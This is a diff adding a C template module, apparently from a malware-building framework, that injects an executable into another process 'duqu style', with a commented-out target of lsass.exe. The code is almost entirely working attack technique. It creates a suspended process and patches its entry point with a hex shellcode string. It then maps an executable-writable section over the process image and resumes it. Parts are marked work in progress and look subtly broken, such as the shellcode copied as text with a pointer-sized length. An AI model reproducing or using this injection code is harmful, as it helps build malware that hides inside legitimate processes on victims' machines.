@@ -1,0 +1,126 @@
+#DOC
+Inject buffered executable inside a process, duqu style
+Code stolen from w4kfu
+WORK IN PROGRESS
+In vars : buffered executable (IVAR1), cover application path (IVAR2)
+
+#INVAR
+IVAR1, IVAR2
+
+#OTVAR
+
+#INCLUDES
+<windows.h>,<winnt.h>
+
+#VARS
+
+STARTUPINFO si, PROCESS_INFORMATION pi, char path_lsass[MAX_PATH], DWORD nb_read, DWORD ImageBase, HANDLE hsect, LONG stat, PVOID BaseAddress = NULL, PVOID BaseAddress2 = NULL, DWORD oep, char read_proc[0x6000], LARGE_INTEGER a, SIZE_T size, IMAGE_DOS_HEADER *idh, IMAGE_NT_HEADERS *inh
+
+#HEADER
+
+typedef long int (__stdcall* ZwQueryInformationProcessF)(HANDLE, LONG, PVOID, ULONG, PULONG);
+ZwQueryInformationProcessF ZwQueryInformationProcess = (ZwQueryInformationProcessF)GetProcAddress(GetModuleHandleA("ntdll"),"ZwQueryInformationProcess");
+
+typedef long int (__stdcall* ZwMapViewOfSectionF)(HANDLE,HANDLE,PVOID *,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,DWORD,ULONG,ULONG);
+ZwMapViewOfSectionF ZwMapViewOfSection = (ZwMapViewOfSectionF)GetProcAddress(GetModuleHandleA("ntdll"),"ZwMapViewOfSection");
+
+typedef long int (__stdcall* ZwUnmapViewOfSectionF)(HANDLE,PVOID);
+ZwUnmapViewOfSectionF ZwUnmapViewOfSection = (ZwUnmapViewOfSectionF)GetProcAddress(GetModuleHandleA("ntdll"),"ZwUnmapViewOfSection");
+
+typedef long int (__stdcall* ZwCreateSectionF)(PHANDLE,ACCESS_MASK,PDWORD,PLARGE_INTEGER,ULONG,ULONG,HANDLE);
+ZwCreateSectionF ZwCreateSection = (ZwCreateSectionF)GetProcAddress(GetModuleHandleA("ntdll"),"ZwCreateSection");
+
+typedef struct _PEB *PPEB;
+
+typedef struct PROCESS_BASIC_INFORMATION PROCESS_BASIC_INFORMATION;
+typedef struct PROCESS_BASIC_INFORMATION {
+    PVOID Reserved1;
+    PPEB PebBaseAddress;
+    PVOID Reserved2[2];
+    ULONG_PTR UniqueProcessId;
+    PVOID Reserved3;
+};
+PROCESS_BASIC_INFORMATION pbi;
+
+#MAIN
+
+idh = NULL;
+inh = NULL;
+
+memset(&si, 0, sizeof(STARTUPINFO));
+si.cb = sizeof(STARTUPINFO);
+memset(&pi, 0, sizeof(PROCESS_INFORMATION));
+memset(&pbi, 0, sizeof(PROCESS_BASIC_INFORMATION));
+//ExpandEnvironmentStrings(TEXT("%SystemRoot%\\system32\\lsass.exe"), (LPSTR)path_lsass, MAX_PATH);
+ExpandEnvironmentStrings(TEXT("C:\\hello.exe"), (LPSTR)path_lsass, MAX_PATH);
+printf("[+] New Path for lsasse.exe = %s\n", path_lsass);
+
+// | CREATE_NO_WINDOW
+if (!CreateProcess(NULL, TEXT(path_lsass), NULL, NULL, 0, CREATE_SUSPENDED|DETACHED_PROCESS, NULL, NULL, &si, &pi))
+{
+printf("No process");
+printf("LatError = %x\n", GetLastError());
+}
+
+ZwQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);
+
+printf("[+] UniqueProcessID = 0x%x\n", pbi.UniqueProcessId);
+
+ReadProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + 8, &ImageBase, 4, &nb_read);
+
+printf("[+] ImageBase = 0x%x\n", ImageBase);
+
+ReadProcessMemory(pi.hProcess, (LPCVOID)ImageBase, read_proc, 0x6000, &nb_read);
+
+printf("(dbg) Two first bytes : %c%c\n", read_proc[0], read_proc[1]);
+
+idh = (IMAGE_DOS_HEADER*)read_proc;
+inh = (IMAGE_NT_HEADERS *)((BYTE*)read_proc + idh->e_lfanew);
+printf("Entrypoint = %x\n", inh->OptionalHeader.AddressOfEntryPoint);
+oep = inh->OptionalHeader.AddressOfEntryPoint;
+
+a.HighPart = 0;
+a.LowPart = 0x8EF6;
+
+stat = ZwCreateSection(&hsect, SECTION_ALL_ACCESS, NULL, &a, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+printf("[-] NTSTATUS = %x\n", stat);
+
+size = 0x8000;
+
+BaseAddress = (PVOID)0;
+
+stat = ZwMapViewOfSection(hsect, GetCurrentProcess(), &BaseAddress, 0, 0, NULL, &size, 1, 0, PAGE_EXECUTE_READWRITE);
+printf("[-] NTSTATUS = %x\n", stat);
+
+void *tutu = "EB2E33C08B3C2483C70A8807BF771D807CFFD7EB2B33C08B3C2483C7048807BF6A18C177FFD733C050BFEACD817CFFD7E8CDFFFFFF6D73766372742E646C6CFFE8D0FFFFFF596F70FF";
+
+memcpy((BYTE*)read_proc + oep, tutu, sizeof(tutu));
+//memset((BYTE*)read_proc + oep, 0x61, 1);
+//memset((BYTE*)read_proc + oep + 1, 0x62, 1);
+//memset((BYTE*)read_proc + oep, &IVAR1, sizeof(&IVAR1));
+memcpy(BaseAddress, read_proc, 0x2000);
+BaseAddress = (PVOID)ImageBase;
+printf("BaseAddress = %x\n", BaseAddress);
+
+ReadProcessMemory(pi.hProcess, (LPCVOID)ImageBase + oep, read_proc, 0x6000, &nb_read);
+
+printf("(dbg) Two first bytes : %c%c\n", read_proc[0], read_proc[1]);
+
+stat = ZwUnmapViewOfSection(pi.hProcess, BaseAddress);
+printf("[-] NTSTATUS = %x\n", stat);
+
+ReadProcessMemory(pi.hProcess, (LPCVOID)ImageBase + oep, read_proc, 0x6000, &nb_read);
+
+printf("(dbg) Two first bytes : %c%c\n", read_proc[0], read_proc[1]);
+
+stat = ZwMapViewOfSection(hsect, pi.hProcess, &BaseAddress, 0, 0, NULL, &size, 1, 0, PAGE_EXECUTE_READWRITE);
+printf("[-] NTSTATUS = %x\n", stat);
+
+ReadProcessMemory(pi.hProcess, (LPCVOID)ImageBase + oep, read_proc, 0x6000, &nb_read);
+
+printf("(dbg) Two first bytes : %c%c\n", read_proc[0], read_proc[1]);
+
+printf("BaseAddress = %x\n", BaseAddress);
+ResumeThread(pi.hThread);
+
+#FOOTER
